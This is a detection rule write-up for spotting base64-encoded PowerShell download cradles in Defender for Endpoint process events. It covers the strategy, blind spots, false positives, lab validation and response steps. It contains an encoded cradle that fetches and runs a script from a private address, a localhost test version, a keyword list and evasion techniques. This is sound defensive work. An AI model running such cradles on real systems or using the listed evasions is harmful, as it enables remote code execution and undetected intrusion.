# Encoded PowerShell download cradle

| | |
|---|---|
| **Rule** | [`rule.yaml`](rule.yaml) |
| **Data** | `DeviceProcessEvents` (Defender for Endpoint) |
| **ATT&CK** | T1059.001 PowerShell, T1027.010 Command Obfuscation, T1105 Ingress Tool Transfer |
| **Severity** | High |
| **Runs** | Hourly over 1 hour |

## Goal
See through `-EncodedCommand`, and alert only when the hidden command fetches or runs remote code.

## Strategy
Alerting on every `-enc` is noisy: SCCM, Intune and plenty of admin scripts use it. Alerting on keywords in the raw command line misses everything that's encoded. So the rule **decodes in the query**:

1. PowerShell processes (by file name *or* original file name, so renamed binaries count) whose command line has `-e`/`-ec`/`-enc`/…/`-EncodedCommand` (any prefix PowerShell accepts, `-` or `/`) followed by a base64 blob.
2. Pull out the blob, `base64_decode_tostring()` it, and strip the `\x00` bytes. PowerShell encodes as UTF-16LE, so every other byte is null.
3. Alert if the decoded text contains a download or in-memory execution primitive: `Net.WebClient`, `DownloadString`, `Invoke-WebRequest`/`iwr`, `Invoke-RestMethod`, BITS, `IEX`, `FromBase64String`, `Reflection.Assembly`, `-bxor`.
4. Pull any URLs out of the decoded command for the analyst and for URL entity mapping.

`Decoded` is in the alert, so triage starts with the real command instead of a blob.

## Technical context
- Example that fires:
  `powershell -NoP -W Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AMQAwAC4AMAAuADAALgA1AC8AYQAuAHAAcwAxACIAKQA=`
  → `IEX (New-Object Net.WebClient).DownloadString("http://10.0.0.5/a.ps1")`
- Double-encoded payloads (base64 inside the decoded base64) still hit, through the `frombase64string` keyword.

## Blind spots
- Obfuscation *inside* the decoded text: string concatenation (`'Down'+'loadString'`), backticks, `-join`, char arrays. Invoke-Obfuscation output can evade the keyword list. Cover the gap with AMSI / `DeviceEvents` script-block content where available.
- Cradles that don't use `-EncodedCommand`: `-Command` with plain text, stdin piping, `.ps1` files on disk. A sibling rule on plain `-Command` with the same keywords covers the first.
- PowerShell hosted in other processes (`System.Management.Automation.dll` loaded by a non-PowerShell binary).

## False positives
- Management agents (SCCM `ccmexec.exe`, Intune Management Extension, some RMM tools) that use encoded commands to download their own content. Add the parent to `trustedParents`, and check the URL points at your own infrastructure.
- Installer bootstrap scripts (Chocolatey, some vendor installers) run by IT.

## Validation
On a lab host:
```powershell
$c = 'IEX (New-Object Net.WebClient).DownloadString("http://127.0.0.1/x")'
powershell -enc ([Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($c)))
```
One alert. `Decoded` shows the cradle, `FirstUrl` = `http://127.0.0.1/x`.

## Response
1. Read `Decoded` and fetch the URL's content safely (sandbox / threat intel) to see the next stage.
2. Check the parent chain: Office app → PowerShell means phishing; `wmiprvse`/`services` means remote execution or persistence.
3. Isolate the host if the next stage downloaded, and hunt the same URL/domain across the estate.
